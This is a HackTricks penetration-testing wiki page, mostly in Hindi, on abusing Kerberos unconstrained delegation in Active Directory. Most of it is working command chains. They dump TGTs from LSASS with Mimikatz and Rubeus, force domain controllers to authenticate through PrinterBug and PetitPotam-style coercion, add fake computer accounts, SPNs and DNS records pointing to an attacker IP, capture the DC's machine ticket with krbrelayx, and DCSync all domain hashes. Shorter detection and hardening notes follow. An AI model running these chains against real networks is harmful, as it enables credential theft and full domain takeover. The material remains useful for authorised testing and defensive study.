# Unconstrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Unconstrained delegation

यह एक ऐसी feature है जिसे Domain Administrator domain के अंदर किसी भी **Computer** पर set कर सकता है। इसके बाद, जब भी कोई **user logins** करके उस Computer पर जाता है, तो उस user के **TGT की एक copy** DC द्वारा दिए गए **TGS के अंदर भेजी** जाती है और **LSASS में memory में save** हो जाती है। इसलिए, यदि आपके पास उस machine पर Administrator privileges हैं, तो आप **tickets को dump करके users का impersonate** किसी भी machine पर कर सकेंगे।

इसलिए, यदि कोई domain admin "Unconstrained Delegation" feature activated वाले Computer पर logins करता है और आपके पास उस machine के अंदर local admin privileges हैं, तो आप ticket को dump करके Domain Admin का कहीं भी impersonate कर सकेंगे (domain privesc)।

आप **इस attribute वाले Computer objects को ढूंढ सकते हैं**, यह जाँचकर कि [userAccountControl](<https://msdn.microsoft.com/en-us/library/ms680832(v=vs.85).aspx>) attribute में [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) शामिल है या नहीं। आप यह LDAP filter ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’ से कर सकते हैं, जिसका उपयोग powerview करता है:
```bash
# List unconstrained computers
## Powerview
## A DCs always appear and might be useful to attack a DC from another compromised DC from a different domain (coercing the other DC to authenticate to it)
Get-DomainComputer –Unconstrained –Properties name
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)'

## ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem

# Export tickets with Mimikatz
## Access LSASS memory
privilege::debug
sekurlsa::tickets /export #Recommended way
kerberos::list /export #Another way

# Monitor logins and export new tickets
## Doens't access LSASS memory directly, but uses Windows APIs
Rubeus.exe dump
Rubeus.exe monitor /interval:10 [/filteruser:<username>] #Check every 10s for new TGTs
```
Administrator (या victim user) का ticket **Mimikatz** या [**Pass the Ticket**](pass-the-ticket.md) के लिए **Rubeus** का उपयोग करके memory में load करें।\
अधिक जानकारी: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)<sup>[[2]](#references)</sup>\
[**ired.team में Unconstrained delegation के बारे में अधिक जानकारी।**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)<sup>[[2]](#references)[[3]](#references)</sup>

### **Force Authentication**

यदि कोई attacker **"Unconstrained Delegation" के लिए allowed computer को compromise** करने में सक्षम है, तो वह किसी **Print server** को **automatically login** करने के लिए **trick** कर सकता है, जिससे server की memory में एक **TGT** save हो जाता है।\
इसके बाद, attacker **user Print server computer account का impersonate करने के लिए Pass the Ticket attack** कर सकता है।

किसी भी machine के विरुद्ध Print server को login कराने के लिए आप [**SpoolSample**](https://github.com/leechristensen/SpoolSample) का उपयोग कर सकते हैं:
```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```
यदि TGT किसी domain controller से है, तो आप [**DCSync attack**](acl-persistence-abuse/index.html#dcsync) कर सकते हैं और DC से सभी hashes प्राप्त कर सकते हैं।\
[**इस attack के बारे में ired.team पर अधिक जानकारी।**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)<sup>[[10]](#references)</sup>

**authentication force करने** के अन्य तरीके यहाँ देखें:


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

कोई भी अन्य coercion primitive, जो victim को **Kerberos** के माध्यम से आपके unconstrained-delegation host पर authenticate कराता है, काम करेगा। आधुनिक environments में इसका अक्सर अर्थ है कि classic PrinterBug flow को reachable RPC surface के आधार पर **PetitPotam**, **DFSCoerce**, **ShadowCoerce**, **MS-EVEN**, या **WebClient/WebDAV**-based coercion से बदलना।

### unconstrained delegation वाले user/service account का दुरुपयोग

Unconstrained delegation केवल **computer objects** तक सीमित नहीं है। किसी **user/service account** को भी `TRUSTED_FOR_DELEGATION` के रूप में configure किया जा सकता है। इस स्थिति में practical requirement यह है कि account को अपने स्वामित्व वाले **SPN** के लिए Kerberos service tickets प्राप्त होने चाहिए।

इससे 2 बहुत सामान्य offensive paths मिलते हैं:

1. आप unconstrained-delegation वाले **user account** का password/hash compromise करते हैं, फिर उसी account में **SPN** जोड़ते हैं।
2. Account में पहले से एक या अधिक SPNs होते हैं, लेकिन उनमें से कोई एक **stale/decommissioned hostname** की ओर point करता है; missing **DNS A record** को फिर से बनाना ही SPN set में बदलाव किए बिना authentication flow को hijack करने के लिए पर्याप्त है।<sup>[[8]](#references)</sup>

न्यूनतम Linux flow:
```bash
# 1) Find unconstrained-delegation users and their SPNs
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)' -Properties serviceprincipalname | ? {$_.serviceprincipalname}
findDelegation.py -target-domain <DOMAIN_FQDN> <DOMAIN>/<USER>:'<PASS>'

# 2) If needed, add a listener SPN to the compromised unconstrained user
python3 addspn.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \
-s 'HOST/kud-listener.<DOMAIN_FQDN>' --target-type samname <DC_IP>

# 3) Make the hostname resolve to your attacker box
python3 dnstool.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \
-r 'kud-listener.<DOMAIN_FQDN>' -a add -t A -d <ATTACKER_IP> <DC_IP>

# 4) Start krbrelayx with the unconstrained user's Kerberos material
#    For user accounts, the salt is usually UPPERCASE_REALM + samAccountName
python3 krbrelayx.py --krbsalt '<DOMAIN_FQDN_UPPERCASE>svc_kud' --krbpass '<PASS>' -dc-ip <DC_IP>

# 5) Coerce the DC/target server to authenticate to the SPN you own
python3 printerbug.py '<DOMAIN>/svc_kud:<PASS>'@<DC_FQDN> kud-listener.<DOMAIN_FQDN>
# Or swap the coercion primitive for PetitPotam / DFSCoerce / Coercer if needed

# 6) Reuse the captured ccache for DCSync or lateral movement
KRB5CCNAME=DC1\\$@<DOMAIN_FQDN>_krbtgt@<DOMAIN_FQDN>.ccache \
secretsdump.py -k -no-pass -just-dc <DOMAIN_FQDN>/ -dc-ip <DC_IP>
```
Notes:

- यह विशेष रूप से तब उपयोगी है जब unconstrained principal एक **service account** हो और आपके पास केवल उसके credentials हों, किसी joined host पर code execution न हो।
- यदि target user के पास पहले से कोई **stale SPN** है, तो AD में नया SPN लिखने की तुलना में संबंधित **DNS record** को दोबारा बनाना कम noisy हो सकता है।
- हाल की Linux-centric tradecraft में `addspn.py`, `dnstool.py`, `krbrelayx.py` और एक coercion primitive का उपयोग किया जाता है; chain पूरा करने के लिए आपको किसी Windows host को छूने की आवश्यकता नहीं है।

### एक attacker-created computer के साथ Unconstrained Delegation का दुरुपयोग

आधुनिक domains में अक्सर `MachineAccountQuota > 0` होता है (default 10), जिससे कोई भी authenticated principal अधिकतम N computer objects बना सकता है। यदि आपके पास `SeEnableDelegationPrivilege` token privilege (या equivalent rights) भी है, तो आप नए बनाए गए computer को unconstrained delegation के लिए trusted के रूप में set कर सकते हैं और privileged systems से आने वाले inbound TGTs को harvest कर सकते हैं।<sup>[[1]](#references)</sup>

High-level flow:

1) अपने नियंत्रण वाला एक computer बनाएं
```bash
# Impacket addcomputer.py (any authenticated user if MachineAccountQuota > 0)
addcomputer.py -computer-name <FAKEHOST> -computer-pass '<Strong.Passw0rd>' -dc-ip <DC_IP> <DOMAIN>/<USER>:'<PASS>'
```
2) domain के अंदर fake hostname को resolvable बनाएं
```bash
# krbrelayx dnstool.py - add an A record for the host FQDN to point to your listener IP
python3 dnstool.py -u '<DOMAIN>\\<FAKEHOST>$' -p '<Strong.Passw0rd>' \
--action add --record <FAKEHOST>.<DOMAIN_FQDN> --type A --data <ATTACKER_IP> \
-dns-ip <DC_IP> <DC_FQDN>
```
3) Attacker-controlled computer पर Unconstrained Delegation सक्षम करें
```bash
# Requires SeEnableDelegationPrivilege (commonly held by domain admins or delegated admins)
# BloodyAD example
bloodyAD -d <DOMAIN_FQDN> -u <USER> -p '<PASS>' --host <DC_FQDN> add uac '<FAKEHOST>$' -f TRUSTED_FOR_DELEGATION
```
यह कैसे काम करता है: unconstrained delegation के साथ, delegation-enabled computer पर LSA आने वाले TGTs को cache करता है। यदि आप किसी DC या privileged server को अपने fake host पर authenticate करने के लिए trick करते हैं, तो उसका machine TGT store हो जाएगा और उसे export किया जा सकता है।

4) krbrelayx को export mode में शुरू करें और Kerberos material तैयार करें
```bash
# Older labs often use RC4/NT hashes, but modern domains frequently negotiate AES for machine accounts.
# Prefer supplying the AES key directly, or derive it from the known password+salt if needed.
python3 krbrelayx.py --aesKey <AES256_KEY> -dc-ip <DC_IP>

# Alternative if you know the password and correct Kerberos salt:
python3 krbrelayx.py --krbpass '<Strong.Passw0rd>' --krbsalt '<CASE_SENSITIVE_SALT>' -dc-ip <DC_IP>
```
5) DC/servers से अपने fake host पर authentication कराने के लिए बाध्य करें
```bash
# netexec (CME fork) coerce_plus module supports multiple coercion vectors
# Common options: METHOD=PrinterBug|PetitPotam|DFSCoerce|MSEven
netexec smb <DC_FQDN> -u '<FAKEHOST>$' -p '<Strong.Passw0rd>' -M coerce_plus -o LISTENER=<FAKEHOST>.<DOMAIN_FQDN> METHOD=PrinterBug
```
krbrelayx ccache files save करेगा जब कोई machine authenticate करती है, उदाहरण के लिए:
```
Got ticket for DC1$@DOMAIN.TLD [krbtgt@DOMAIN.TLD]
Saving ticket in DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache
```
6) कैप्चर किए गए DC machine TGT का उपयोग करके DCSync करें
```bash
# Create a krb5.conf for the realm (netexec helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# Use the saved ccache to DCSync (netexec helper)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
netexec smb <DC_FQDN> --use-kcache --ntds

# Alternatively with Impacket (Kerberos from ccache)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```
- `MachineAccountQuota > 0` unprivileged computer creation को सक्षम करता है; अन्यथा आपको explicit rights की आवश्यकता होती है।
- किसी computer पर `TRUSTED_FOR_DELEGATION` सेट करने के लिए `SeEnableDelegationPrivilege` (या domain admin) आवश्यक है।
- अपने fake host के लिए name resolution (DNS A record) सुनिश्चित करें, ताकि DC उस तक FQDN के माध्यम से पहुंच सके।
- Coercion के लिए एक viable vector आवश्यक है (PrinterBug/MS-RPRN, EFSRPC/PetitPotam, DFSCoerce, MS-EVEN, आदि)। यदि संभव हो, तो इन्हें DCs पर disable करें।
- यदि victim account को **"Account is sensitive and cannot be delegated"** के रूप में चिह्नित किया गया है या वह **Protected Users** का सदस्य है, तो forwarded TGT को service ticket में शामिल नहीं किया जाएगा, इसलिए इस chain से reusable TGT प्राप्त नहीं होगा।<sup>[[9]](#references)</sup>
- यदि authenticating client/server पर **Credential Guard** enabled है, तो Windows **Kerberos unconstrained delegation** को block करता है, जिससे operator के दृष्टिकोण से अन्यथा valid coercion paths fail हो सकते हैं।

Detection और hardening के विचार:

- Event ID 4741 (computer account created) और 4742/4738 (computer/user account changed) पर alert करें, जब UAC `TRUSTED_FOR_DELEGATION` सेट हो।
- Domain zone में unusual DNS A-record additions की निगरानी करें।
- अनपेक्षित hosts से 4768/4769 और non-DC hosts को होने वाली DC-authentications में spikes पर नजर रखें।
- `SeEnableDelegationPrivilege` को minimal set तक सीमित करें, जहां संभव हो `MachineAccountQuota=0` सेट करें, और DCs पर Print Spooler disable करें। LDAP signing और channel binding enforce करें।

### Mitigation

- DA/Admin logins को specific services तक सीमित करें
- Privileged accounts के लिए "Account is sensitive and cannot be delegated" सेट करें।

## References

- [1] [HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
- [2] [harmj0y – S4U2Pwnage](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)
- [3] [ired.team – Domain compromise via unrestricted delegation](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)
- [4] [krbrelayx](https://github.com/dirkjanm/krbrelayx)
- [5] [Impacket addcomputer.py](https://github.com/fortra/impacket)
- [6] [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [7] [netexec (CME fork)](https://github.com/Pennyw0rth/NetExec)
- [8] [Praetorian – Unconstrained Delegation in Active Directory](https://www.praetorian.com/blog/unconstrained-delegation-active-directory/)
- [9] [Microsoft Learn – Protected Users Security Group](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group)
- [10] [ired.team – Domain compromise via DC print server and Kerberos delegation](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)

{{#include ../../banners/hacktricks-training.md}}
